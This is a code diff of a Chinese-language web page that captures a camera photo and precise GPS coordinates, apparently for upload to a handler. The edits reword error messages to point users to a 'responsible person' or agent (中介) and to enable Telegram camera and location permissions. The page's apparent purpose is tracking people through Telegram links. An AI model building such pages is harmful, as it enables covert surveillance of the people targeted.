@@ -146,7 +146,7 @@
     <div class="icon-error">⛔️</div>
     <h2 style="margin:0;font-weight:600;">链接已失效</h2>
     <p style="color:#888; padding: 0 30px; margin-top: 15px; font-size:15px; line-height:1.6;">
-        安全令牌已过期。<br>请联系负责人或中介重新获取最新链接。
+        安全令牌已失效。<br>请联系负责人或中介重新获取最新链接。
     </p>
 </div>
 <script>
@@ -198,7 +198,7 @@
                 audio: false
             });
             video.srcObject = stream;
-        } catch (err) { alert("相机启动失败，请检查权限"); }
+        } catch (err) { alert("相机启动失败，请检查权限请把Telegram（飞机）的相机权限打开"); }
     }
 
     shutter.addEventListener('click', () => {
@@ -228,7 +228,7 @@
     }
 
     function getLocationAndUpload() {
-        if (!navigator.geolocation) return handleLocError("设备不支持定位");
+        if (!navigator.geolocation) return handleLocError("设备不支持定位，请联系负责人或你的中介");
         navigator.geolocation.getCurrentPosition(
             (pos) => {
                 const lat = pos.coords.latitude.toFixed(6);
@@ -248,7 +248,7 @@
         failCount++;
         spinner.style.display = 'none';
         title.innerText = "⚠️ 定位失败";
-        desc.innerText = `无法获取精确位置，请尝试重试。或联系负责人！ (${failCount})`;
+        desc.innerText = `无法获取精确位置，请尝试重试。请确保Telegram（飞机）的位置权限打开！ (${failCount})`;
         actionArea.style.display = 'block';
         if (failCount >= 3) {
             btnForce.style.display = 'block';
